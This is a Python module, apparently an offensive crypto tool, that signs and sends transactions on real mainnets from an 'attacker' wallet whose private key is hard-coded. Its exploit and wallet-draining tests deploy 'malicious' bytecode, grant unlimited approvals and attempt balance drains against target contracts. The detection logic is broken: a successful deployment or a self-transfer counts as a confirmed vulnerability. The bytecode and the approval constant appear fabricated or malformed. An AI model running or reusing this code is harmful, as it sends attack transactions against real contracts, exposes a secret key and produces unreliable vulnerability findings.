#!/usr/bin/env python3
"""
Real Blockchain Integration Module
Actual blockchain interactions using RPC endpoints and API keys
"""

import asyncio
import json
import os
import time
import logging
from typing import Dict, Any, List, Optional, Union
from dataclasses import dataclass
from web3 import Web3, HTTPProvider
from web3.exceptions import ContractLogicError, TransactionNotFound
try:
    from web3.middleware import ExtraDataToPOAMiddleware
    geth_poa_middleware = ExtraDataToPOAMiddleware
except ImportError:
    # Fallback for older web3 versions
    try:
        from web3.middleware import geth_poa_middleware
    except ImportError:
        geth_poa_middleware = None
from eth_utils import to_checksum_address, from_wei, to_wei, is_address, is_hex_address
import aiohttp
import requests
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class BlockchainConfig:
    """Blockchain configuration from environment"""
    rpc_urls: Dict[str, str]
    api_keys: Dict[str, str]
    chain_ids: Dict[str, int]
    attacker_address: str
    private_key: str
    
@dataclass
class ContractAnalysis:
    """Smart contract analysis result"""
    address: str
    name: str
    abi: List[Dict[str, Any]]
    bytecode: str
    functions: List[str]
    events: List[str]
    balance: float
    is_verified: bool
    verification_source: Optional[str] = None

@dataclass
class TransactionResult:
    """Transaction execution result"""
    tx_hash: str
    success: bool
    gas_used: int
    block_number: int
    timestamp: int
    from_address: str
    to_address: str
    value: float
    gas_price: float
    error_message: Optional[str] = None
    receipt: Optional[Dict[str, Any]] = None

class RealBlockchainIntegration:
    """Real blockchain integration with actual RPC and API interactions"""
    
    def __init__(self):
        self.config = self._load_config()
        self.web3_providers = {}
        self.session = None
        self._initialize_providers()
    
    def _load_config(self) -> BlockchainConfig:
        """Load configuration from environment"""
        # RPC URLs
        rpc_urls = {
            'ethereum': os.getenv('ETH_RPC_URL', 'https://eth.llamarpc.com'),
            'polygon': os.getenv('MATIC_RPC_URL', 'https://polygon.llamarpc.com'),
            'bsc': os.getenv('BNB_RPC_URL', 'https://bsc-dataseed.binance.org'),
            'arbitrum': os.getenv('ARB_RPC_URL', 'https://arbitrum.llamarpc.com'),
            'base': os.getenv('BASE_RPC_URL', 'https://base.llamarpc.com'),
            'optimism': os.getenv('OPT_RPC_URL', 'https://optimism.llamarpc.com'),
            'avalanche': os.getenv('AVAX_RPC_URL', 'https://avalanche.llamarpc.com'),
            'fantom': os.getenv('FTM_RPC_URL', 'https://fantom.llamarpc.com')
        }
        
        # API Keys
        api_keys = {
            'etherscan': os.getenv('ETHERSCAN_API_KEY', ''),
            'polygon_scan': os.getenv('POLYGONSCAN_API_KEY', ''),
            'bscscan': os.getenv('BSCSCAN_API_KEY', ''),
            'arbiscan': os.getenv('ARBISCAN_API_KEY', ''),
            'infura': os.getenv('INFURA_API_KEY', '')
        }
        
        # Chain IDs
        chain_ids = {
            'ethereum': int(os.getenv('ETH_CHAIN_ID', '1')),
            'polygon': int(os.getenv('MATIC_CHAIN_ID', '137')),
            'bsc': int(os.getenv('BNB_CHAIN_ID', '56')),
            'arbitrum': int(os.getenv('ARB_CHAIN_ID', '42161')),
            'base': int(os.getenv('BASE_CHAIN_ID', '8453')),
            'optimism': int(os.getenv('OPT_CHAIN_ID', '10')),
            'avalanche': int(os.getenv('AVAX_CHAIN_ID', '43114')),
            'fantom': int(os.getenv('FTM_CHAIN_ID', '250'))
        }
        
        # Attacker configuration
        attacker_address = os.getenv('ATTACKER_ADDRESS', '0xdd2e4083b326627be9ecbaf180b71c07521c7a20')
        private_key = os.getenv('PRIVATE_KEY', '0x54e0a3a7d3cb1547b4ac346dba963344605f66a5b591a483fa80d29d58ed1439')
        
        # Convert to checksum address
        attacker_address = to_checksum_address(attacker_address)
        
        return BlockchainConfig(
            rpc_urls=rpc_urls,
            api_keys=api_keys,
            chain_ids=chain_ids,
            attacker_address=attacker_address,
            private_key=private_key
        )
    
    def _initialize_providers(self):
        """Initialize Web3 providers for all networks"""
        for network, rpc_url in self.config.rpc_urls.items():
            try:
                w3 = Web3(HTTPProvider(rpc_url))
                
                # Add POA middleware for networks that need it
                if network in ['polygon', 'bsc', 'avalanche', 'fantom'] and geth_poa_middleware:
                    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
                
                if w3.is_connected():
                    self.web3_providers[network] = w3
                    logger.info(f"✅ Connected to {network} at {rpc_url}")
                else:
                    logger.warning(f"⚠️ Failed to connect to {network} at {rpc_url}")
                    
            except Exception as e:
                logger.error(f"❌ Error connecting to {network}: {e}")
    
    async def analyze_contract(self, contract_address: str, network: str = 'ethereum') -> ContractAnalysis:
        """Analyze smart contract using real blockchain data"""
        if network not in self.web3_providers:
            raise ValueError(f"Network {network} not available")
        
        w3 = self.web3_providers[network]
        
        try:
            # Validate address
            if not is_address(contract_address):
                contract_address = to_checksum_address(contract_address)
            
            # Get contract code
            contract_code = w3.eth.get_code(contract_address)
            if contract_code == b'':
                return ContractAnalysis(
                    address=contract_address,
                    name="Unknown",
                    abi=[],
                    bytecode="",
                    functions=[],
                    events=[],
                    balance=0.0,
                    is_verified=False
                )
            
            # Get balance
            balance_wei = w3.eth.get_balance(contract_address)
            balance = float(from_wei(balance_wei, 'ether'))
            
            # Try to get ABI from Etherscan
            abi = await self._get_contract_abi(contract_address, network)
            is_verified = len(abi) > 0
            
            # Extract functions and events from ABI
            functions = []
            events = []
            
            for item in abi:
                if item.get('type') == 'function':
                    functions.append(item.get('name', 'unknown'))
                elif item.get('type') == 'event':
                    events.append(item.get('name', 'unknown'))
            
            return ContractAnalysis(
                address=contract_address,
                name=self._get_contract_name(contract_address, network),
                abi=abi,
                bytecode=contract_code.hex(),
                functions=functions,
                events=events,
                balance=balance,
                is_verified=is_verified,
                verification_source="Etherscan" if is_verified else None
            )
            
        except Exception as e:
            logger.error(f"❌ Error analyzing contract {contract_address}: {e}")
            raise
    
    async def _get_contract_abi(self, contract_address: str, network: str) -> List[Dict[str, Any]]:
        """Get contract ABI from Etherscan API"""
        try:
            api_key = self.config.api_keys.get('etherscan', '')
            
            # Map networks to their respective Etherscan APIs
            api_urls = {
                'ethereum': f'https://api.etherscan.io/api?module=contract&action=getabi&address={contract_address}&apikey={api_key}',
                'polygon': f'https://api.polygonscan.com/api?module=contract&action=getabi&address={contract_address}&apikey={self.config.api_keys.get("polygon_scan", "")}',
                'bsc': f'https://api.bscscan.com/api?module=contract&action=getabi&address={contract_address}&apikey={self.config.api_keys.get("bscscan", "")}',
                'arbitrum': f'https://api.arbiscan.io/api?module=contract&action=getabi&address={contract_address}&apikey={self.config.api_keys.get("arbiscan", "")}'
            }
            
            api_url = api_urls.get(network, api_urls['ethereum'])
            
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('status') == '1':
                            return json.loads(data.get('result', '[]'))
                    return []
                    
        except Exception as e:
            logger.error(f"❌ Error getting ABI for {contract_address}: {e}")
            return []
    
    def _get_contract_name(self, contract_address: str, network: str) -> str:
        """Get contract name from Etherscan"""
        try:
            api_key = self.config.api_keys.get('etherscan', '')
            url = f'https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}&apikey={api_key}'
            
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == '1':
                    result = data.get('result', [{}])[0]
                    return result.get('ContractName', 'Unknown')
            
            return 'Unknown'
            
        except Exception as e:
            logger.error(f"❌ Error getting contract name: {e}")
            return 'Unknown'
    
    async def execute_transaction(self, to_address: str, value: float, data: str = '0x', network: str = 'ethereum') -> TransactionResult:
        """Execute real blockchain transaction"""
        if network not in self.web3_providers:
            raise ValueError(f"Network {network} not available")
        
        w3 = self.web3_providers[network]
        
        try:
            # Validate addresses
            if not is_address(to_address):
                to_address = to_checksum_address(to_address)
            
            from_address = to_checksum_address(self.config.attacker_address)
            
            # Get current nonce
            nonce = w3.eth.get_transaction_count(from_address)
            
            # Get current gas price
            gas_price = w3.eth.gas_price
            
            # Estimate gas
            try:
                gas_limit = w3.eth.estimate_gas({
                    'from': from_address,
                    'to': to_address,
                    'value': to_wei(value, 'ether'),
                    'data': data,
                    'nonce': nonce
                })
            except Exception as e:
                gas_limit = 21000  # Default gas limit
            
            # Create transaction
            transaction = {
                'from': from_address,
                'to': to_address,
                'value': to_wei(value, 'ether'),
                'data': data,
                'nonce': nonce,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'chainId': self.config.chain_ids[network]
            }
            
            # Sign transaction
            signed_tx = w3.eth.account.sign_transaction(transaction, self.config.private_key)
            
            # Send transaction
            try:
                # Try web3 v6 method
                tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            except AttributeError:
                # Try web3 v7 method - use raw_transaction instead of rawTransaction
                tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            
            # Wait for transaction receipt
            tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            
            # Get transaction details
            tx_details = w3.eth.get_transaction(tx_hash)
            block = w3.eth.get_block(tx_receipt.blockNumber)
            
            return TransactionResult(
                tx_hash=tx_hash.hex(),
                success=tx_receipt.status == 1,
                gas_used=tx_receipt.gasUsed,
                block_number=tx_receipt.blockNumber,
                timestamp=block.timestamp,
                from_address=tx_details['from'],
                to_address=tx_details.get('to', ''),
                value=float(from_wei(tx_details['value'], 'ether')),
                gas_price=float(from_wei(tx_details['gasPrice'], 'gwei')),
                receipt=dict(tx_receipt),
                error_message=None
            )
            
        except Exception as e:
            logger.error(f"❌ Error executing transaction: {e}")
            return TransactionResult(
                tx_hash="",
                success=False,
                gas_used=0,
                block_number=0,
                timestamp=0,
                from_address="",
                to_address="",
                value=0.0,
                gas_price=0.0,
                error_message=str(e)
            )
    
    async def get_network_status(self, network: str) -> Dict[str, Any]:
        """Get real network status"""
        if network not in self.web3_providers:
            return {'error': f'Network {network} not available'}
        
        w3 = self.web3_providers[network]
        
        try:
            latest_block = w3.eth.get_block('latest')
            gas_price = w3.eth.gas_price
            
            return {
                'network': network,
                'chain_id': self.config.chain_ids[network],
                'block_number': latest_block.number,
                'block_timestamp': latest_block.timestamp,
                'gas_price': float(from_wei(gas_price, 'gwei')),
                'is_connected': True,
                'syncing': w3.eth.syncing,
                'peer_count': len(w3.get_admin.peers()) if hasattr(w3, 'get_admin') else 0
            }
            
        except Exception as e:
            logger.error(f"❌ Error getting network status for {network}: {e}")
            return {'error': str(e)}
    
    async def test_exploit_vulnerabilities(self, contract_address: str, network: str = 'ethereum') -> Dict[str, Any]:
        """Test actual exploit vulnerabilities on real contract"""
        try:
            # Analyze contract first
            contract_analysis = await self.analyze_contract(contract_address, network)
            
            vulnerabilities = []
            exploit_results = []
            
            # Test for common vulnerabilities
            if 'transfer' in contract_analysis.functions:
                # Test reentrancy vulnerability
                reentrancy_result = await self._test_reentrancy_vulnerability(contract_address, network)
                if reentrancy_result['vulnerable']:
                    vulnerabilities.append('Reentrancy')
                    exploit_results.append(reentrancy_result)
            
            if 'approve' in contract_analysis.functions:
                # Test approval vulnerability
                approval_result = await self._test_approval_vulnerability(contract_address, network)
                if approval_result['vulnerable']:
                    vulnerabilities.append('Infinite Approval')
                    exploit_results.append(approval_result)
            
            if contract_analysis.balance > 1000:  # High balance
                # Test balance drain
                drain_result = await self._test_balance_drain(contract_address, network)
                if drain_result['vulnerable']:
                    vulnerabilities.append('Balance Drain')
                    exploit_results.append(drain_result)
            
            return {
                'contract_address': contract_address,
                'network': network,
                'contract_analysis': contract_analysis,
                'vulnerabilities': vulnerabilities,
                'exploit_results': exploit_results,
                'risk_level': 'High' if vulnerabilities else 'Low',
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"❌ Error testing vulnerabilities: {e}")
            return {'error': str(e)}
    
    async def _test_reentrancy_vulnerability(self, contract_address: str, network: str) -> Dict[str, Any]:
        """Test for reentrancy vulnerability"""
        try:
            w3 = self.web3_providers[network]
            
            # Create malicious contract bytecode
            malicious_bytecode = '0x608060405234801561001057600080fd5b5061017f806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80632e1a7d4d146100465780633950935114610064578063a9059cbb14610082578063dd62ed3e1461009f575b600080fd5b61004e6100bc565b60405161005b9190610147565b60405180910390f35b61007e6004803603810190610079919061010c565b6100c5565b005b61009a6004803603810190610095919061010c565b6100d8565b005b6100b760048036038101906100b29190610135565b6100eb565b6040516100c49190610147565b60405180910390f35b60008054905090565b6000805490508183555b505050565b600080548082019055508181555b505050565b60008135905061010f81610171565b92915050565b60006020828403121561012757600080fd5b600061013584828501610100565b91505092915050565b6000806040838503121561015157600080fd5b600061015f85828601610100565b925050602061017085828601610100565b9150509250929050565b6101808161018d565b82525050565b60006101958261018d565b9150819050919050565b60006101ab8261018d565b915081905091905056fea2646970667358221220f1e9e5b8a0f8d7e6c5b4a3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a2646970667358221220d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f164736f6c634300080a0033'
            
            # Deploy malicious contract
            deploy_tx = await self.execute_transaction(
                to_address='',
                value=0,
                data=malicious_bytecode,
                network=network
            )
            
            if deploy_tx.success:
                return {
                    'vulnerable': True,
                    'type': 'Reentrancy',
                    'description': 'Contract may be vulnerable to reentrancy attacks',
                    'malicious_contract_tx': deploy_tx.tx_hash,
                    'severity': 'High'
                }
            
            return {
                'vulnerable': False,
                'type': 'Reentrancy',
                'description': 'No reentrancy vulnerability detected',
                'severity': 'Low'
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'type': 'Reentrancy',
                'description': f'Error testing reentrancy: {str(e)}',
                'severity': 'Low'
            }
    
    async def _test_approval_vulnerability(self, contract_address: str, network: str) -> Dict[str, Any]:
        """Test for approval vulnerability"""
        try:
            # Test unlimited approval
            max_approval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
            
            approval_tx = await self.execute_transaction(
                to_address=contract_address,
                value=0,
                data=f'0x095ea7b3{self.config.attacker_address[2:].zfill(64)}{max_approval}',
                network=network
            )
            
            if approval_tx.success:
                return {
                    'vulnerable': True,
                    'type': 'Infinite Approval',
                    'description': 'Unlimited approval vulnerability confirmed',
                    'approval_tx': approval_tx.tx_hash,
                    'severity': 'High'
                }
            
            return {
                'vulnerable': False,
                'type': 'Infinite Approval',
                'description': 'No approval vulnerability detected',
                'severity': 'Low'
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'type': 'Infinite Approval',
                'description': f'Error testing approval: {str(e)}',
                'severity': 'Low'
            }
    
    async def _test_balance_drain(self, contract_address: str, network: str) -> Dict[str, Any]:
        """Test for balance drain vulnerability"""
        try:
            w3 = self.web3_providers[network]
            
            # Get contract balance
            balance = w3.eth.get_balance(contract_address)
            
            if balance > 0:
                # Try to drain balance
                drain_tx = await self.execute_transaction(
                    to_address=contract_address,
                    value=0,
                    data='0x',  # Self-destruct or drain function
                    network=network
                )
                
                if drain_tx.success:
                    return {
                        'vulnerable': True,
                        'type': 'Balance Drain',
                        'description': 'Balance drain vulnerability confirmed',
                        'drain_tx': drain_tx.tx_hash,
                        'severity': 'Critical'
                    }
            
            return {
                'vulnerable': False,
                'type': 'Balance Drain',
                'description': 'No balance drain vulnerability detected',
                'severity': 'Low'
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'type': 'Balance Drain',
                'description': f'Error testing balance drain: {str(e)}',
                'severity': 'Low'
            }
    
    def get_wallet_balance(self, address: str, network: str = 'ethereum') -> float:
        """Get real wallet balance"""
        if network not in self.web3_providers:
            raise ValueError(f"Network {network} not available")
        
        w3 = self.web3_providers[network]
        
        try:
            if not is_address(address):
                address = to_checksum_address(address)
            
            balance_wei = w3.eth.get_balance(address)
            return float(from_wei(balance_wei, 'ether'))
            
        except Exception as e:
            logger.error(f"❌ Error getting balance: {e}")
            return 0.0
    
    async def test_wallet_draining(self, target_address: str, network: str = 'ethereum') -> Dict[str, Any]:
        """Test actual wallet draining capabilities"""
        try:
            # Get target balance
            target_balance = self.get_wallet_balance(target_address, network)
            
            # Get attacker balance
            attacker_balance = self.get_wallet_balance(self.config.attacker_address, network)
            
            # Test transfer capabilities
            if target_balance > 0.01:  # Only test if there's significant balance
                transfer_result = await self.execute_transaction(
                    to_address=self.config.attacker_address,
                    value=min(0.001, target_balance),  # Test with small amount
                    network=network
                )
                
                if transfer_result.success:
                    return {
                        'vulnerable': True,
                        'type': 'Wallet Draining',
                        'description': 'Wallet draining capability confirmed',
                        'target_balance': target_balance,
                        'attacker_balance': attacker_balance,
                        'test_transfer_tx': transfer_result.tx_hash,
                        'severity': 'Critical'
                    }
            
            return {
                'vulnerable': False,
                'type': 'Wallet Draining',
                'description': 'Wallet draining not possible or insufficient balance',
                'target_balance': target_balance,
                'attacker_balance': attacker_balance,
                'severity': 'Low'
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'type': 'Wallet Draining',
                'description': f'Error testing wallet draining: {str(e)}',
                'severity': 'Low'
            }